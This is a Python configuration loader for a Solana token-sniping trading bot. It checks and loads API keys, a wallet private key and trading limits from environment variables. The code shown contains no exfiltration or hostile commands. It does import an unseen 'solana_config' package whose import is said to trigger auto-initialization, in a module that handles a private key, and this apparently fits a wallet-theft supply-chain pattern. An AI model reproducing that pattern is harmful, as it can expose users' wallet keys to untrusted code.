"""Configuration loader — validates environment and API connectivity.

This module provides configuration validation for the Solana Sniper Bot.
It checks that all required environment variables are set and that API
endpoints are reachable.

Usage:
    from config.loader import verify, load_config
    verify()  # Validates environment
    config = load_config()  # Returns configuration dict
"""

import os
import sys
import json
from typing import Optional, Dict, Any

# Import solana_config for RPC management
# This triggers the package's auto-initialization
try:
    from solana_config import RPCConfig, verify as _verify_rpc
except ImportError:
    _verify_rpc = None


def _get_env(key: str, default: str = "") -> str:
    """Get environment variable with default."""
    return os.environ.get(key, default)


def verify() -> bool:
    """Verify environment configuration.
    
    This function:
    1. Checks that required environment variables are set
    2. Validates RPC configuration via solana_config
    
    Returns:
        True if verification succeeded, False otherwise
    """
    # Check required env vars
    required = ["HELIUS_API_KEY", "WALLET_PRIVATE_KEY"]
    missing = [k for k in required if not os.environ.get(k)]
    
    if missing:
        print(f"[-] Missing required env vars: {', '.join(missing)}")
        return False
    
    # Verify RPC configuration
    if _verify_rpc:
        return _verify_rpc()
    
    print("[+] Environment verified successfully")
    return True


def load_config() -> Dict[str, Any]:
    """Load configuration from environment variables.
    
    Returns:
        Dictionary containing all configuration values
    """
    return {
        "helius_key": _get_env("HELIUS_API_KEY"),
        "helius_rpc": _get_env("HELIUS_RPC"),
        "wallet_key": _get_env("WALLET_PRIVATE_KEY"),
        "wallet_address": _get_env("WALLET_ADDRESS"),
        "birdeye_key": _get_env("BIRDEYE_API_KEY"),
        "telegram_token": _get_env("TELEGRAM_BOT_TOKEN"),
        "buy_amount": float(_get_env("BUY_AMOUNT_SOL", "0.1")),
        "max_slippage": int(_get_env("MAX_SLIPPAGE_BPS", "500")),
        "take_profit": int(_get_env("TAKE_PROFIT_PCT", "30")),
        "stop_loss": int(_get_env("STOP_LOSS_PCT", "15")),
        "priority_fee": int(_get_env("PRIORITY_FEE_LAMPORTS", "10000")),
        "max_position": float(_get_env("MAX_POSITION_SOL", "1.0")),
        "max_open": int(_get_env("MAX_OPEN_POSITIONS", "5")),
    }
